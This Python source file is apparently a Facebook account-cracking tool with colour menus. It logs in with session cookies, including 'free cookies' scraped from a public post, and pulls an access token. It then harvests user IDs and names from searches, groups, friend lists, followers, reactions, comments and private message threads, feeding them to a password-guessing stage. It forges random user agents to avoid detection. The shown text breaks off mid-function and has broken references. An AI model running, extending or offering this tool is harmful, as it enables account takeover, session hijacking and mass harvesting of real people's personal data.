import os, sys, re, time, requests, calendar, random, bs4, subprocess, uuid, json, threading,platform,string
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import date,datetime
from time import sleep
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn

console = Console()
ses = requests.Session()
device = platform.platform()

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI

Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

ses = requests.Session()
reset = "[/]"
IP = requests.get("http://ip-api.com/json/").json()["query"]
negara = requests.get("http://ip-api.com/json/").json()["country"]
datt = []
loop = 0
id,id2,ok,cp = [],[],0,0
mtd_dev = []
opt = []
idz = []
apk = []
files = []
pwx = []
uasm = []
azxc = []
id_groups = []
data = {}
ugent1, ugent2 = [],[]

pwd_time = int(datetime.now().timestamp())

try:
	color_rich = open("data/color_rich.txt","r").read()
except FileNotFoundError:
	color_rich = "[#00C8FF]"
try:
	color_table = open("data/color_table.txt","r").read()
except FileNotFoundError:
	color_table = "#00C8FF"

def clear_screen():
	if "linux" in sys.platform.lower():
		try:os.system("clear")
		except:pass
	elif "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass

###----------[ GET TIME ]---------- ###
now = datetime.now()
day = now.day
month = now.month
year = now.year
month_birthday = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
month_cek = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
	if month < 0 or month > 12:
		exit()
	month_now = month - 1
except ValueError:exit()
_month_ = month_cek[month_now]
my_date = date.today()
day_now = calendar.day_name[my_date.weekday()]
date_now = ("%s-%s-%s-%s"%(day_now,day,_month_,year))

for x in range(1000):
	rr = random.randint
	rc = random.choice
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP"
	if ugent1 in uasm:pass
	else:uasm.append(ugent1)
	ugent2 = f"Mozilla/5.0 (Linux; U; Android {str(rr(8,10))}; en-US; Redmi Note {str(rr(5,8))} Build/PKQ1.{str(rr(111111,199999))}.00{str(rr(1,9))} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.{str(rr(1111,6666))}.2 UCBrowser/13.4.0.{str(rr(1111,6666))} Mobile Safari/537.36"
	if ugent2 in uasm:pass
	else:uasm.append(ugent2)
	ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; en-US; SM-{str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Mobile UCBrowser/3.4.3.{str(rr(111,999))}"
	if ugent3 in uasm:pass
	else:uasm.append(ugent3)

def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "good morning"
	elif 12 <= hours < 15:timenow = "good afternoon"
	elif 15 <= hours < 18:timenow = "good evening"
	else:timenow = "good night"
	return timenow

###----------[ LOGO ]---------- ###
def logo():
	clear_screen()
	prints(Panel(f"""{color_rich} ________   ___      ___  _______    _______  
("      "\ |"  \    /"  ||   _  "\  /"     "|  {M2}██████████████████████{reset}
 \___/   :) \   \  //   |(. |_)  :)(: ______)  {M2}██████████████████████{reset}
   /  ___/  /\\  \/.    ||:     \/  \/    |     {P2}██████████████████████{reset}
  //  \__  |: \.        |(|  _  \\  // ___)     {P2}██████████████████████{reset}
 (:   / "\ |.  \    /:  ||: |_)  :)(:  (      
  \_______)|___|\__/|___|(_______/  \__/      Made By {M2}Indonesia {P2}Coder""",title=f"{P2}{waktu()}",style=f"{color_table}"))

###----------[ LOGIN ]---------- ###
def login():
	logo()
	nama = "-"
	uid = "-"
	ttl = "-"

	email = "bagja@gmail.com"
	joined = "24 Maret 2022"
	expired = "24 Maret 2023"
	datt.append(Panel(f"{P2}Nama : {nama} \nID : {uid} \nTgl Lahir : {ttl}",width=37,title=f"{P2}data account",style=f"{color_table}"))
	datt.append(Panel(f"{P2}Email : {email} \nBergabung : {joined} \nKadaluwarsa : {expired}",width=37,title=f"{P2}data apikey",style=f"{color_table}"))
	console.print(Columns(datt))

	prints(Panel(f"{P2}{IP}",padding=(0,30),title=f"{P2}IP",subtitle=f"{H2}{negara}",style=f"{color_table}"))
	prints(Panel(f"""{P2}[{color_rich}01{P2}]. login tools using cookie  [{color_rich}04{P2}]. see all results crack
[{color_rich}02{P2}]. free cookies for login    [{color_rich}05{P2}]. checkpoint detector
[{color_rich}03{P2}]. crack menu without login  [{color_rich}06{P2}]. change theme color""",width=80,padding=(0,5),style=f"{color_table}"))
	log = input(f" {N}input choice : ")
	if log in["1","01"]:
		prints(Panel(f"""{P2}please enter cookies and do not use your personal account for sacrifice""",width=80,style=f"{color_table}"))
		cookie = input(f" {N}cookie : ")
		login_cookie(cookie)
	elif log in["2","02"]:
		free_cookies()
	elif log in["3","03"]:
		crack_without_login()
	elif log in["4","04"]:
		see_results()
	elif log in["5","05"]:
		check_option()
	elif log in["6","06"]:
		change_theme()

def crack_without_login():
	prints(Panel(f"""{P2}[{color_rich}01{P2}]. crack from search name v1  [{color_rich}04{P2}]. crack from public groups
[{color_rich}02{P2}]. crack from search name v2  [{color_rich}05{P2}]. crack from posts comments
[{color_rich}03{P2}]. crack from search name v3  [{color_rich}06{P2}]. crack from random email""",width=80,padding=(0,4),style=f"{color_table}"))
	ask = input(f" {N}input choice : ")
	if ask in["1","01"]:
		search_name_v1()
	elif ask in["2","02"]:
		search_name_v2()
	elif ask in["3","03"]:
		random_email()
	elif ask in["4","04"]:
		grup_no_login()
	elif ask in["5","05"]:
		public_comments_v2()
	elif ask in["6","06"]:
		random_email()
	else:
		login()

def login_cookie(cookie):
	try:
		data = ses.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie})
		find_token = re.search("(EAAG\w+)", data.text)
		open("data/token.txt", "w").write(find_token.group(1))
		open("data/cookie.txt", "w").write(cookie)
		prints(Panel(f"""{P2}{find_token.group(1)}""",width=80,style=f"{color_table}"))
		sleep(3)
		menu()
	except Exception as e:
		os.system("rm -f data/token.txt data/cookie.txt")
		prints(Panel(f"""{P2}cookie invalid,please try other cookie and make sure authentication off""",width=80,style=f"{color_table}"))
		exit()

def free_cookies():
	url = parser(ses.get("https://mbasic.facebook.com/100032386028880/posts/674525870303608/?app=fbl").text,"html.parser")
	data = re.findall('"text":"(.*?)"',str(url))
	cokxyz = []
	n = 0
	for cok in data:
		if len(cok)>=20:
			try:
				if cok in cokxyz:pass
				else:
					n +=1
					cokxyz.append(cok)
					prints(Panel(f"""{P2}[{n}]. {cok}""",width=80,style=f"{color_table}"))
			except:continue
	ask = input(f" {N}choose your number : ")
	try:
		cookie = cokxyz[int(ask)-1]
		login_cookie(cookie)
	except Exception as e:
		prints(Panel(f"""{P2}fill in using numbers instead of letters or something else""",width=80,style=f"{color_table}"))
		exit()

def delete():
	try:os.remove("data/token.txt")
	except:pass
	try:os.remove("data/cookie.txt")
	except:pass

def menu():
	try:
		token = open("data/token.txt","r").read()
		cok = open("data/cookie.txt","r").read()
		cookie = {"cookie":cok}
		data = ses.get(f"https://graph.facebook.com/me?fields=name,id,birthday &access_token={token}",cookies=cookie).json()
		nama = data["name"]
		uid = data["id"]
		ttl = data["birthday"]
	except (FileNotFoundError,KeyError,IOError):
		delete()
		login()
	logo()
	akmj.append(Panel(f"{P2}Nama : {nama} \nID : {uid} \nTgl Lahir : {ttl}",width=37,title=f"{P2}data account",style=f"{color_table}"))
	akmj.append(Panel(f"{P2}Email : {email} \nBergabung : {joined} \nKadaluwarsa : {expired}",width=37,title=f"{P2}data apikey",style=f"{color_table}"))
	console.print(Columns(akmj))

	prints(Panel(f"{P2}{IP}",padding=(0,30),title=f"{P2}IP",subtitle=f"{H2}{negara}",style=f"{color_table}"))
	prints(Panel(f"""{P2}[{color_rich}01{P2}]. crack from search name v1 [{color_rich}09{P2}]. crack from group members
[{color_rich}02{P2}]. crack from search name v2 [{color_rich}10{P2}]. crack from post coments v1
[{color_rich}03{P2}]. crack from search name v3 [{color_rich}11{P2}]. crack from post coments v2
[{color_rich}04{P2}]. crack from random email   [{color_rich}12{P2}]. crack from messengers
[{color_rich}05{P2}]. crack from public friends [{color_rich}13{P2}]. crack from requests page
[{color_rich}06{P2}]. crack from multi target   [{color_rich}14{P2}]. crack friends from friends
[{color_rich}07{P2}]. crack from followers      [{color_rich}15{P2}]. crack friends from search
[{color_rich}08{P2}]. crack from all reactions  [{color_rich}16{P2}]. crack from multi files""",width=80,padding=(0,4),style=f"{color_table}"))
	prints(Panel(f"""{P2}type 'bot' for enter to bot menu or type 'more' for enter to more menu""",width=80,style=f"{color_table}"))
	ask = input(f" {N}input choice : ")
	if ask in["1","01"]:
		search_name_v1()
	elif ask in["2","02"]:
		search_name_v2()
	elif ask in["3","03"]:
		search_name_v3(cookie)
	elif ask in["4","04"]:
		random_email()
	elif ask in["5","05"]:
		public_friends(token,cookie)
	elif ask in["6","06"]:
		multi_target(token,cookie)
	elif ask in["7","07"]:
		followers(token,cookie)
	elif ask in["8","08"]:
		all_reactions(cookie)
	elif ask in["9","09"]:
		group_members(token,cookie)
	elif ask in["10"]:
		public_comments_v1(cookie)
	elif ask in["11"]:
		public_comments_v2()
	elif ask in["12"]:
		message(token,cookie)
	elif ask in["13"]:
		requests_page(cookie)
	elif ask in["14"]:
		friendsfromfriends(token,cookie)
	elif ask in["15"]:
		friends_from_search(token,cookie)
	elif ask in["16"]:
		multi_files()
	elif ask in["bot"]:
		prints(Panel(f"""{P2}feature is not available at this time. please wait for the update""",width=80,style=f"{color_table}"))
		exit()
	elif ask in["more"]:
		more()
	else:
		menu()

def more():
	prints(Panel(f"""{P2}[{color_rich}01{P2}]. see all results cracks    [{color_rich}06{P2}]. settings your user agent
[{color_rich}02{P2}]. checkpoint detector       [{color_rich}07{P2}]. change theme color
[{color_rich}03{P2}]. take id for target crack  [{color_rich}08{P2}]. cek update version now
[{color_rich}04{P2}]. dump id for output file   [{color_rich}09{P2}]. information tools & author
[{color_rich}05{P2}]. check information account [{color_rich}10{P2}]. logout (delete login)""",width=80,padding=(0,4),style=f"{color_table}"))
	tol = input(f" {N}input choice : ")
	if tol in["1","01"]:
		see_results()
	elif tol in["2","02"]:
		check_option()
	elif tol in["3","03"]:
		prints(Panel(f"""{P2}feature is not available at this time. please wait for the update""",width=80,style=f"{color_table}"))
		exit()
	elif tol in["4","04"]:
		prints(Panel(f"""{P2}feature is not available at this time. please wait for the update""",width=80,style=f"{color_table}"))
		exit()
	elif tol in["5","05"]:
		prints(Panel(f"""{P2}feature is not available at this time. please wait for the update""",width=80,style=f"{color_table}"))
		exit()
	elif tol in["6","06"]:
		prints(Panel(f"""{P2}feature is not available at this time. please wait for the update""",width=80,style=f"{color_table}"))
		exit()
	elif tol in["7","07"]:
		change_theme()
	elif tol in["8","08"]:
		prints(Panel(f"""{P2}feature is not available at this time. please wait for the update""",width=80,style=f"{color_table}"))
		exit()
	elif tol in["9","09"]:
		prints(Panel(f"""{P2}feature is not available at this time. please wait for the update""",width=80,style=f"{color_table}"))
		exit()
	elif tol in["10"]:
		delete()
		prints(Panel(f"""{P2}successfully deleted token login info and cookies""",width=80,style=f"{color_table}"))
		exit()
	else:
		menu()

def convert_id(user):
	payload = {"fburl": "https://free.facebook.com/{user}", "check": "Lookup"}
	if "facebook" in user:
		payload = {"fburl": user, "check": "Lookup"}
	url = parser(ses.post("https://lookup-id.com/", data=payload).content,"html.parser")
	data = url.find("span", id="code")
	idt = data.text
	return idt

def search_name_v1():
	prints(Panel(f"""{P2}you must enter a search name. You can use a comma (,) as a separator if you want more than 1 name""",width=80,style=f"{color_table}"))
	idt = input(f" {N}input name : ").split(",")
	prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
	for set3 in idt:
		dump_search(f"https://mbasic.facebook.com/public/{set3}?/locale2=id_ID")
	setting_password(id)

def search_name_v2():
	prints(Panel(f"""{P2}you must enter a search name. You can use a comma (,) as a separator if you want more than 1 name""",width=80,style=f"{color_table}"))
	idt = input(f" {N}input name : ").split(",")
	prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
	common = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	for set1 in idt:
		idz.append(set1)
		for set2 in common:
			idz.append(set2+" "+set1) 
	for set3 in idz:
		dump_search(f"https://mbasic.facebook.com/public/{set3}?/locale2=id_ID")
	setting_password(id)

def dump_search(url):
	try:
		data = parser(ses.get(str(url)).text,'html.parser')
		for z in data.find_all("td"):
			tampung = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(z))
			for uid,name in tampung:
				if "profile.php?" in uid:uid = re.findall("id=(.*)",str(uid))[0]
				elif "<span" in name:name = re.findall("(.*?)\<",str(name))[0]
				if uid+"<=>"+name in id:pass
				else:id.append(uid+"<=>"+name)
				sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
		for x in data.find_all("a",href=True):
			if "Lihat Hasil Selanjutnya" in x.text:
				dump_search(x.get("href"))
	except:
		pass

def random_email():
	x = 0
	prints(Panel(f"""{P2}[{color_rich}01{P2}]. dump search name from @gmail.com
[{color_rich}02{P2}]. dump search name from @yahoo.com
[{color_rich}03{P2}]. dump search name from @hotmail.com
[{color_rich}04{P2}]. dump search name from @outlook.com""",width=80,padding=(0,14),style=f"{color_table}"))
	ask = input(f" {N}choose email : ")
	if ask in["1"]:
		email = "@gmail.com"
		nama = input(f" {N}input name : ")
		jumlah = int(input(f" {N}input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(nama+str(x)+email+"<=>"+nama)
			sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
	elif ask in["2"]:
		email = "@yahoo.com"
		nama = input(f" {N}input name : ")
		jumlah = int(input(f" {N}input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(nama+str(x)+email+"<=>"+nama)
			sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
	elif ask in["3"]:
		email = "@hotmail.com"
		nama = input(f" {N}input name : ")
		jumlah = int(input(f" {N}input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(nama+str(x)+email+"<=>"+nama)
			sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
	elif ask in["4"]:
		email = "@outlook.com"
		nama = input(f" {N}input name : ")
		jumlah = int(input(f" {N}input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(nama+str(x)+email+"<=>"+nama)
			sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
	setting_password(id)

def search_name_v3(cookie):
	prints(Panel(f"""{P2}you must enter a search name. You can use a comma (,) as a separator if you want more than 1 name""",width=80,style=f"{color_table}"))
	idt = input(f" {N}input name : ").split(",")
	for idz in idt:
		get_pencarian_cookie("https://mbasic.facebook.com/search/people/?q={idz}",cookie)
	setting_password(id)

def get_pencarian_cookie(url,cookie):
	try:
		req = ses.get(url,cookies=cookie)
		data = parser(req.content,"html.parser")
		for z in data.find_all('a',href=True):
			if "<img alt=" in str(z):
				if "home.php" in str(z["href"]):continue
				else:
					try:
						if "profile.php" in z.get("href"):
							uid = z.get("href").split('=')[1].replace("&refid","")
							nama = z.find("img").get("alt").replace(", profile picture","")
							id.append(uid+"<=>"+nama)
						else:
							uid = z.get("href").split('/')[1].replace("?refid=46","")
							nama = z.find("img").get("alt").replace(", profile picture","")
							id.append(uid+"<=>"+nama)
					except:pass
		for x in data.find_all('a',href=True): 
			if "Lihat Hasil Selanjutnya" in x.text:
				get_pencarian_cookie(x["href"],cookie)
	except Exception as e:
		pass

def public_friends(token,cookie):
	prints(Panel(f"""{P2}input the target id, make sure the target id is public and not private""",subtitle=f"{P2}fill 'me' for dump from your friends",width=80,style=f"{color_table}"))
	user = input(f" {N}input target id : ")
	if(re.findall("\w+",user)):
		try:idt = convert_id(user)
		except:idt = user
	try:
		for i in ses.get(f"https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
			id.append(i["id"]+"<=>"+i["name"])
			sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
	except KeyError:exit("\n  [!] akun tidak tersedia atau list teman private")
	setting_password(id)

def multi_target(token,cookie):
	prints(Panel(f"""{P2}input the number of target id, if you want 1 you just enter""",width=80,style=f"{color_table}"))
	try:tanya_total = int(input(f" {N}input total target : "))
	except:tanya_total=1
	prints(Panel(f"""{P2}input the target id, make sure the target id is public and not private""",subtitle=f"{P2}fill 'me' for dump from your friends",width=80,style=f"{color_table}"))
	for t in range(tanya_total):
		t +=1
		print("")
		user = input(f" {N}input target id {O}{t}{N} : ")
		if(re.findall("\w+",user)):
			try:idt = convert_id(user)
			except:idt = user
		try:
			for i in ses.get(f"https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
				try:
					uid = i['id']+'<=>'+i['name']
					if uid in id:pass
					else:id.append(uid)
				except:continue
				sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
		except KeyError:print("  [!] akun tidak tersedia atau list teman private")
	setting_password(id)

def followers(token,cookie):
	prints(Panel(f"""{P2}input the target id, make sure the target id is public and not private""",subtitle=f"{P2}fill 'me' for dump from your followers",width=80,style=f"{color_table}"))
	user = input(f" {N}input target id : ")
	if(re.findall("\w+",user)):
		try:idt = convert_id(user)
		except:idt = user
	try:
		for i in ses.get(f"https://graph.facebook.com/{idt}?fields=name,subscribers.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["subscribers"]["data"]:
			id.append(i["id"]+"<=>"+i["name"])
			sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
	except KeyError:exit("\n  [!] akun tidak tersedia atau list teman private")
	setting_password(id)

def all_reactions(cookie):
	global react_type
	prints(Panel(f"""{P2}[{color_rich}01{P2}]. crack from all reactions  [{color_rich}05{P2}]. crack from haha reactions
[{color_rich}02{P2}]. crack from like reactions [{color_rich}06{P2}]. crack from wow reactions
[{color_rich}03{P2}]. crack from love reactions [{color_rich}07{P2}]. crack from sad reactions
[{color_rich}04{P2}]. crack from angry reactions[{color_rich}08{P2}]. crack from care reactions""",width=80,padding=(0,4),style=f"{color_table}"))
	react = input(f" {N}choose react : ")
	if react in["01","1"]:
		react_type="0"
	elif react in["02","2"]:
		react_type="1"
	elif react in["03","3"]:
		react_type="2"
	elif react in["04","4"]:
		react_type="8"
	elif react in["05","5"]:
		react_type="4"
	elif react in["06","6"]:
		react_type="3"
	elif react in["07","7"]:
		react_type="7"
	elif react in["08","8"]:
		react_type="16"
	prints(Panel(f"""{P2}make sure the post id is public or not private. if private will return empty result""",width=80,style=f"{color_table}"))
	idt = input(f" {N}input id post : ")
	prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
	url = "https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier="+idt
	dump_react(url,cookie)
	setting_password(id)

def dump_react(url,cookie):
	data = parser(ses.get(url,cookies=cookie,headers=header_grup).text.encode("utf-8"),"html.parser")
	try: 
		for isi in data.find_all('h3'):
			for ids in isi.find_all('a',href=True):
				try:
					if "profile.php" in ids.get("href"):
						uid = ids.get("href").split('=')[1]
						nama = ids.text
						id.append(uid+"<=>"+nama)
					else:
						uid = ids.get("href").split('/')[1]
						nama = ids.text
						id.append(uid+"<=>"+nama)
					sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
				except:continue
		for lanjut in data.find_all("a",href=True):
			if "Lihat Selengkapnya" in lanjut.text:
				dump_react("https://mbasic.facebook.com/"+lanjut.get("href").replace('reaction_type=0','reaction_type='+react_type),cookie)
	except:
		pass

###----------[ MENU DUMP GROUPS ]---------- ###
def group_members(token,cookie):
	prints(Panel(f"""{P2}[{color_rich}01{P2}]. dump from search name groups
[{color_rich}02{P2}]. dump from one groups joined
[{color_rich}03{P2}]. dump from id groups public""",width=80,padding=(0,19),style=f"{color_table}"))
	ask = input(f" {N}input choice : ")
	if ask in["1"]:
		idt = input(f" {N}input name : ")
		url = f"https://mbasic.facebook.com/search/groups/?q={idt}&source=filter&isTrending=0"
		search_name_groups(url,cookie)
		exit(Brute.setting_password(id))
	elif ask in["2"]:
		one_groups_joined(token,cookie)
		exit(Brute.setting_password(id))
	elif ask in["3"]:
		idt = input(f" {N}input id groups : ")
		prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
		url = "https://mbasic.facebook.com/groups/"+idt
		dump_grup_no_login(url)
		setting_password(id)

def search_name_groups(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).text,"html.parser")
		inf = re.findall('\<a\ href\=\"https\:\/\/mbasic\.facebook\.com\/groups\/(.*?)\/\?refid\=.*?\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>\<\/div\>\<div\ class\=\".*?\">\<span\>(.*?)<\/span\>',str(data))
		post = re.findall('\<\/span\>\<\/div\>\<div\ class\=\".*?\">(.*?)<\/div\>',str(data))
		n = 0
		for x in inf:
			if "Grup Privat" in x:
				pass
			else:
				n += 1
				id_groups.append(x[0])
				url = parser(ses.get(f"https://mbasic.facebook.com/groups/{x[0]}").text,"html.parser")
				members = re.findall('Anggota<\/a\>\<\/td\>\<td\ class\=\".*?\">\<span\ class\=\".*?\" id\=\".*?\">(.*?)<\/span\>',str(url))[0]
				prints(Panel(f"""{P2}[{n}]\nName Grup : {x[1]}\nID Grup   : {x[0]}\nMembers   : {members}\nType Grup : {x[2]}""",width=80,style=f"{color_table}"))
	except:pass
	ask = input(f" {N}choose number : ")
	try:
		number = id_groups[int(ask)-1]
		prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
		url = "https://mbasic.facebook.com/groups/"+number
		dump_grup_no_login(url)
	except Exception as e:
		print(e)

def one_groups_joined(token,cookie):
	n = 0
	prints(Panel(f"""{P2}Untuk Berhenti Dump Silahkan Tekan Ctrl Lalu C Di Keyboard Anda""",width=80,style=f"{color_table}"))
	try:
		for i in ses.get(f"https://graph.facebook.com/me/groups?access_token={token}",cookies=cookie).json()["data"]:
			name = i["name"]
			uid = i["id"]
			priv = i["privacy"]
			if "OPEN" not in priv:
				pass
			else:
				n +=1
				type = "Grup Publik"
				id_groups.append(uid)
				url = parser(ses.get(f"https://mbasic.facebook.com/groups/{uid}").text,"html.parser")
				members = re.findall('Anggota<\/a\>\<\/td\>\<td\ class\=\".*?\">\<span\ class\=\".*?\" id\=\".*?\">(.*?)<\/span\>',str(url))[0]
				prints(Panel(f"""{P2}[{n}]\nName Grup : {name}\nID Grup   : {uid}\nMembers   : {members}\nType Grup : {type}""",width=80,style=f"{color_table}"))
	except Exception as e:
		print(e)
	ask = input(f" {N}choose number : ")
	try:
		number = id_groups[int(ask)-1]
		prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
		url = "https://mbasic.facebook.com/groups/"+number
		dump_grup_no_login(url)
	except Exception as e:
		print(e)

def grup_no_login():
	idt = input(f" {N}input id groups : ")
	prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
	url = "https://mbasic.facebook.com/groups/"+idt
	dump_grup_no_login(url)
	setting_password(id)

###----------[ GET DATA FROM GROUP MEMBERS ]---------- ###
def dump_grup_no_login(url):
	try:
		data = parser(ses.get(url, headers={"user-agent": "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba"}).text, "html.parser")
		for x in data.find_all("table"):
			par = x.text
			if ">" in par.split(" ") or "mengajukan" in par.split(" "):
				idz = re.findall("content_owner_id_new.\w+",str(x))[0].replace("content_owner_id_new.","")
				if " mengajukan pertanyaan ." in par:nama = par.replace(" mengajukan pertanyaan .","")
				else:nama = par.split(" > ")[0]
				if idz+"<=>"+nama in id:pass
				else:id.append(idz+"<=>"+nama)
				sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
		for z in data.find_all("a"):
			if "Lihat Postingan Lainnya</span" in str(z).split(">"):
				href = str(z).replace('<a href="','').replace("amp;","").split(" ")[0].replace('"><span>Lihat','')
				dump_grup_no_login("https://m.facebook.com"+href)
	except Exception as e:
		print(e)

def public_comments_v1(cookie):
	prints(Panel(f"""{P2}make sure the post id is public or not private. if private will return empty result""",width=80,style=f"{color_table}"))
	idg = input(f" {N}input id post : ")
	url = "https://mbasic.facebook.com/"+idg
	prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
	get_datacomments(url,cookie)
	setting_password(id)

###----------[ GET DATA FROM PUBLIC COMMENTS ]---------- ###
def get_datacomments(url,cookie):
	urlmain = ses.get(url,cookies=cookie).text.encode("utf-8")
	par = parser(urlmain,'html.parser')
	try:
		for xf in par.find_all('h3'):
			for xx in xf.find_all('a',href=True):
				try:
					if "profile.php" in xx.get("href"):
						z = xx.get("href").split('=')[1]
						x = z.split('&')[0]
						uid = xx.text
						id.append(x+"<=>"+uid)
						sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
				except:pass
		for n in par.find_all("a",href=True):
			if "Lihat komentar lainnya" in n.text:
				get_datacomments("https://mbasic.facebook.com/"+n.get("href"),cookie)
	except:
		pass

###----------[ DUMP FROM PUBLIC COMMENTS ]---------- ###
def public_comments_v2():
	prints(Panel(f"""{P2}make sure the post id is public or not private. if private will return empty result""",width=80,style=f"{color_table}"))
	idg = input(f" {N}input id post : ")
	url = "https://mbasic.facebook.com/"+idg
	prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
	dump_komen_no_login(url)
	setting_password(id)

def message(token,cookie):
	global my_akun
	url = "https://mbasic.facebook.com/messages"
	prints(Panel(f"""{P2}to stop dumping please press ctrl then c in keyboard or turn off data""",width=80,style=f"{color_table}"))
	my_akun = json.loads(ses.get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie).text)["id"]
	get_message(url,cookie)
	setting_password(id)

###----------[ GET DATA FROM MESSAGE ]---------- ###
def get_message(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).text,"html.parser")
		for z in data.find_all('a',href=True):
			if '/messages/read/?tid=cid.c' in z['href']:
				if 'Pengguna Facebook' in str(z):
					continue
				else:
					idzx = re.findall('cid\.c\.(.*?)%3A(.*?)&',str(z))
					for idz in list(idzx.pop()):
						try:
							if idz in my_akun:continue
							else:
								id.append(idz+"<=>"+z.text)
								sys.stdout.write(f"\r {N}process colecting id, succes colect {len(id)} id....");sys.stdout.flush()
						except:continue
		for x in data.find_all('a',href=True):
			if 'Lihat Pesan Sebelumnya' in x.text:
				get_message("https://mbasic.facebook.com"+x["href"],cookie)
	except:
		pass

def requests_page(cookie):
	prints(Panel(f"""{P2}[{color_rich}01{P2}]. dump from friend's suggestion
[{color_rich}02{P2}]. dump from friend request in
[{color_rich}03{P2}]. dump from friend request out""",width=80,padding=(0,19),style=f"{color_table}"))
	ask = input(f" {N}input choice : ")
